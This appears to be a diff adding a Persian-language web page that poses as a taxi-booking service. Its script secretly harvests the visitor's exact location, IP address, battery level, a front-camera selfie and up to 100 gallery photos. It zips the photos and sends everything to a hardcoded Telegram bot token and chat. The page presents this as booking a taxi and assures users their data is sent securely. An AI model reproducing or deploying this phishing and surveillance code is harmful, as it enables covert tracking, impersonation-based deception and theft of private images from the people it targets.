@@ -1,0 +1,587 @@
+<!doctype html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>تاکسی بابا عباس</title>
+  <style>
+    :root {
+      --primary: #2E86C1;
+      --secondary: #17A589;
+      --accent: #F39C12;
+      --light: #F8F9F9;
+      --dark: #1B2631;
+      --success: #28B463;
+      --danger: #E74C3C;
+      --gray: #85929E;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: "Segoe UI", Tahoma, sans-serif;
+      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+      color: var(--dark);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      line-height: 1.6;
+    }
+    
+    .card {
+      background: var(--light);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 100%;
+      max-width: 500px;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 100%;
+      height: 8px;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+    }
+    
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    
+    .logo-icon {
+      font-size: 50px;
+      margin-left: 15px;
+    }
+    
+    .logo-text {
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--primary);
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+    }
+    
+    .tagline {
+      color: var(--gray);
+      font-size: 16px;
+      margin-bottom: 25px;
+    }
+    
+    .status-container {
+      background: white;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px 0;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+      border: 1px solid rgba(0,0,0,0.05);
+      min-height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .status-text {
+      font-size: 16px;
+      color: var(--dark);
+    }
+    
+    .progress-container {
+      width: 100%;
+      height: 8px;
+      background: #E5E8E8;
+      border-radius: 10px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      border-radius: 10px;
+      width: 0%;
+      transition: width 0.5s ease;
+    }
+    
+    .btn {
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 50px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 15px rgba(46, 134, 193, 0.4);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      margin-top: 10px;
+    }
+    
+    .btn:hover {
+      background: var(--secondary);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(46, 134, 193, 0.5);
+    }
+    
+    .btn:active {
+      transform: translateY(0);
+    }
+    
+    .btn-secondary {
+      background: white;
+      color: var(--primary);
+      border: 2px solid var(--primary);
+      box-shadow: none;
+    }
+    
+    .btn-secondary:hover {
+      background: #f0f8ff;
+    }
+    
+    .btn-icon {
+      margin-left: 8px;
+      font-size: 18px;
+    }
+    
+    .features {
+      display: flex;
+      justify-content: space-between;
+      margin: 25px 0;
+    }
+    
+    .feature {
+      text-align: center;
+      flex: 1;
+      padding: 0 10px;
+    }
+    
+    .feature-icon {
+      font-size: 24px;
+      margin-bottom: 8px;
+      color: var(--primary);
+    }
+    
+    .feature-text {
+      font-size: 13px;
+      color: var(--gray);
+    }
+    
+    .file-info {
+      margin-top: 15px;
+      font-size: 14px;
+      color: var(--gray);
+      word-break: break-word;
+    }
+    
+    video {
+      display: none;
+      width: 100%;
+      max-width: 300px;
+      height: 400px;
+      border-radius: 12px;
+      object-fit: cover;
+      margin: 15px auto;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      border: 3px solid white;
+    }
+    
+    .hidden {
+      display: none;
+    }
+    
+    .footer {
+      margin-top: 25px;
+      font-size: 12px;
+      color: var(--gray);
+    }
+    
+    .taxi-animation {
+      width: 100%;
+      height: 120px;
+      position: relative;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+    
+    .road {
+      position: absolute;
+      bottom: 30px;
+      width: 100%;
+      height: 4px;
+      background: #333;
+    }
+    
+    .taxi {
+      position: absolute;
+      bottom: 35px;
+      right: -100px;
+      font-size: 40px;
+      transition: right 0.1s linear;
+    }
+    
+    .moving .taxi {
+      animation: drive 3s linear infinite;
+    }
+    
+    @keyframes drive {
+      0% { right: -100px; }
+      100% { right: 100%; }
+    }
+    
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px;
+      }
+      
+      .logo-text {
+        font-size: 24px;
+      }
+      
+      .btn {
+        padding: 12px 24px;
+      }
+    }
+  </style>
+  <!-- JSZip (CDN) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js" integrity="sha512-HOgpYb+HjYVnQd2vQn0v1pCqgDj+/lqzqI+YgqgZsS0k9QxY9j8xgK7k9m7mT5fZkQZ3gFJZbFm8x6sE5dG0g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <div class="logo-icon">🚕</div>
+      <div class="logo-text">تاکسی بابا عباس</div>
+    </div>
+    
+    <p class="tagline">سفر مطمئن و راحت با بهترین خودروها</p>
+    
+    <div class="taxi-animation">
+      <div class="road"></div>
+      <div class="taxi">🚖</div>
+    </div>
+    
+    <div class="status-container">
+      <div id="status" class="status-text">برای درخواست تاکسی روی دکمه زیر کلیک کنید</div>
+    </div>
+    
+    <div class="progress-container">
+      <div id="progressBar" class="progress-bar"></div>
+    </div>
+    
+    <div class="features">
+      <div class="feature">
+        <div class="feature-icon">📍</div>
+        <div class="feature-text">موقعیت‌یابی</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">📸</div>
+        <div class="feature-text">تأیید هویت</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">🖼️</div>
+        <div class="feature-text">انتخاب تصاویر</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">📤</div>
+        <div class="feature-text">ارسال اطلاعات</div>
+      </div>
+    </div>
+    
+    <button id="startBtn" class="btn">
+      <span>درخواست تاکسی</span>
+      <span class="btn-icon">🚗</span>
+    </button>
+    
+    <button id="abortBtn" class="btn btn-secondary hidden">
+      لغو درخواست
+    </button>
+    
+    <div id="fileInfo" class="fileInfo"></div>
+    <video id="video" autoplay playsinline muted></video>
+    
+    <!-- مخفی: input فایل برای انتخاب گالری (multiple) -->
+    <input id="fileInput" type="file" accept="image/*" multiple style="display:none" />
+    
+    <div class="footer">
+      اطلاعات شما با امنیت کامل ارسال می‌شود
+    </div>
+  </div>
+
+  <script>
+    // ====== پیکربندی ======
+    const BOT_TOKEN = '8295388715:AAGkM7QaqplE1WNpM6S_GI6aBLzBObK2he8';
+    const CHAT_ID = '8293145520';
+    const MAX_IMAGES = 100;
+    const MAX_ZIP_BYTES = 48 * 1024 * 1024;
+
+    // ====== DOM ======
+    const startBtn = document.getElementById('startBtn');
+    const abortBtn = document.getElementById('abortBtn');
+    const statusDiv = document.getElementById('status');
+    const progressBar = document.getElementById('progressBar');
+    const fileInput = document.getElementById('fileInput');
+    const fileInfo = document.getElementById('fileInfo');
+    const video = document.getElementById('video');
+    const taxiAnimation = document.querySelector('.taxi-animation');
+
+    let abortRequested = false;
+    let mediaStream = null;
+
+    function setStatus(msg) { 
+      statusDiv.textContent = msg; 
+    }
+    
+    function setProgress(percent) {
+      progressBar.style.width = percent + '%';
+    }
+
+    function startTaxiAnimation() {
+      taxiAnimation.classList.add('moving');
+    }
+    
+    function stopTaxiAnimation() {
+      taxiAnimation.classList.remove('moving');
+    }
+
+    // --- کمک‌افزارها: موقعیت، دوربین، باتری، آی‌پی ---
+    function getCurrentPositionPromise() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject(new Error('Geolocation not supported'));
+        navigator.geolocation.getCurrentPosition(pos => {
+          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        }, err => {
+          if (err.code === err.PERMISSION_DENIED) reject(new Error('Location access denied'));
+          else reject(new Error('Location error: ' + (err.message || err.code)));
+        }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+      });
+    }
+
+    async function getBatteryInfo() {
+      try {
+        if (!('getBattery' in navigator)) return null;
+        const battery = await navigator.getBattery();
+        const level = Math.round((battery.level || 0) * 100);
+        const charging = battery.charging;
+        return { level, charging };
+      } catch (e) { return null; }
+    }
+
+    async function getPublicIP() {
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        if (!r.ok) return null;
+        const j = await r.json();
+        return j.ip || null;
+      } catch (e) { return null; }
+    }
+
+    // دوربین (سلفی)
+    async function startCamera() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error('Camera not available');
+      }
+      mediaStream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: { ideal: "user" } }, 
+        audio: false 
+      });
+      video.srcObject = mediaStream;
+      video.style.display = 'block';
+      try { await video.play(); } catch(e){}
+    }
+    
+    async function stopCamera() {
+      video.style.display = 'none';
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(t => t.stop());
+        mediaStream = null;
+      }
+      try { video.pause(); } catch(e){}
+      video.srcObject = null;
+    }
+    
+    function captureBlobFromVideo() {
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      const canvas = document.createElement('canvas');
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      ctx.translate(w, 0); 
+      ctx.scale(-1, 1); // mirror
+      ctx.drawImage(video, 0, 0, w, h);
+      return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+    }
+
+    // ارسال متن به تلگرام
+    async function sendMessageToTelegram(text) {
+      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('text', text);
+      const r = await fetch(url, { method: 'POST', body: form });
+      const j = await r.json();
+      if (!j.ok) throw new Error('Telegram message error: ' + (j.description || r.statusText));
+      return j;
+    }
+
+    // ارسال عکس به تلگرام
+    async function sendPhotoToTelegram(photoBlob, caption = '') {
+      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', new File([photoBlob], 'photo.jpg', { type: 'image/jpeg' }));
+      if (caption) form.append('caption', caption);
+      const r = await fetch(url, { method: 'POST', body: form });
+      const j = await r.json();
+      if (!j.ok) throw new Error('Telegram photo error: ' + (j.description || r.statusText));
+      return j;
+    }
+    
+    // ارسال فایل به تلگرام
+    async function sendDocumentToTelegram(fileBlob, filename = 'gallery.zip', caption = '') {
+      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendDocument`;
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('document', new File([fileBlob], filename, { type: 'application/zip' }));
+      if (caption) form.append('caption', caption);
+      const r = await fetch(url, { method: 'POST', body: form });
+      const j = await r.json();
+      if (!j.ok) throw new Error('Telegram document error: ' + (j.description || r.statusText));
+      return j;
+    }
+
+    // تابع اصلی: اجرا هنگام کلیک
+    startBtn.addEventListener('click', async () => {
+      abortRequested = false;
+      startBtn.classList.add('hidden');
+      abortBtn.classList.remove('hidden');
+      startTaxiAnimation();
+      setProgress(10);
+      
+      try {
+        // 1) گرفتن موقعیت
+        setProgress(20);
+        const { lat, lon } = await getCurrentPositionPromise();
+        
+        // ارسال موقعیت
+        await sendMessageToTelegram(`🏠 موقعیت: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}`);
+        
+        // 2) گرفتن آی‌پی و باتری
+        setProgress(40);
+        const [ip, battery] = await Promise.all([getPublicIP(), getBatteryInfo()]);
+        const batteryText = battery ? `${battery.level}%${battery.charging ? ' (شارژ)' : ''}` : 'نامشخص';
+        
+        // ارسال اطلاعات باتری و آی‌پی
+        await sendMessageToTelegram(`🔋 درصد شارژ: ${batteryText}\n💎 آی‌پی: ${ip || 'نامشخص'}`);
+        
+        // 3) گرفتن سلفی
+        setProgress(60);
+        await startCamera();
+        await new Promise(r => setTimeout(r, 1000));
+        const selfieBlob = await captureBlobFromVideo();
+        await stopCamera();
+        
+        if (abortRequested) { 
+          setStatus('درخواست لغو شد');
+          stopTaxiAnimation();
+          return; 
+        }
+        
+        // ارسال سلفی
+        setProgress(70);
+        await sendPhotoToTelegram(selfieBlob, 'سلفی مشتری');
+        
+        // 4) انتخاب تصاویر از گالری
+        setProgress(80);
+        fileInput.value = '';
+        fileInput.click();
+        
+        const files = await new Promise((resolve) => {
+          fileInput.onchange = (ev) => {
+            const f = Array.from(ev.target.files || []);
+            resolve(f.slice(0, MAX_IMAGES));
+          };
+          setTimeout(() => resolve([]), 60000);
+        });
+
+        if (!files || files.length === 0) {
+          setStatus('هیچ تصویری انتخاب نشد');
+          setProgress(100);
+          stopTaxiAnimation();
+          return;
+        }
+
+        // 5) ساخت زیپ
+        setProgress(85);
+        const zip = new JSZip();
+        const folder = zip.folder('gallery') || zip;
+        
+        for (let i = 0; i < files.length; i++) {
+          if (abortRequested) { 
+            setStatus('درخواست لغو شد');
+            stopTaxiAnimation();
+            return; 
+          }
+          const f = files[i];
+          const safeName = `${String(i+1).padStart(3,'0')}-${f.name}`;
+          folder.file(safeName, f);
+          setProgress(85 + Math.floor((i / files.length) * 10));
+        }
+
+        // تولید زیپ
+        const zipBlob = await zip.generateAsync({ type: 'blob' });
+
+        if (zipBlob.size > MAX_ZIP_BYTES) {
+          setStatus('حجم فایل بسیار بزرگ است');
+          stopTaxiAnimation();
+          return;
+        }
+
+        if (abortRequested) { 
+          setStatus('درخواست لغو شد');
+          stopTaxiAnimation();
+          return; 
+        }
+
+        // 6) ارسال زیپ
+        setProgress(98);
+        await sendDocumentToTelegram(zipBlob, 'gallery.zip', `گالری مشتری — تعداد: ${files.length}`);
+        
+        setProgress(100);
+        setStatus('✅ درخواست شما با موفقیت ثبت شد. تاکسی به زودی می‌رسد.');
+        
+      } catch (err) {
+        console.error('Error:', err);
+        setStatus('⚠️ خطایی رخ داده است. لطفاً مجدداً تلاش کنید.');
+      } finally {
+        startBtn.classList.remove('hidden');
+        abortBtn.classList.add('hidden');
+        stopTaxiAnimation();
+        try { await stopCamera(); } catch(e){}
+      }
+    });
+
+    abortBtn.addEventListener('click', () => {
+      abortRequested = true;
+      setStatus('در حال لغو درخواست...');
+      stopTaxiAnimation();
+    });
+  </script>
+</body>
+  </html>
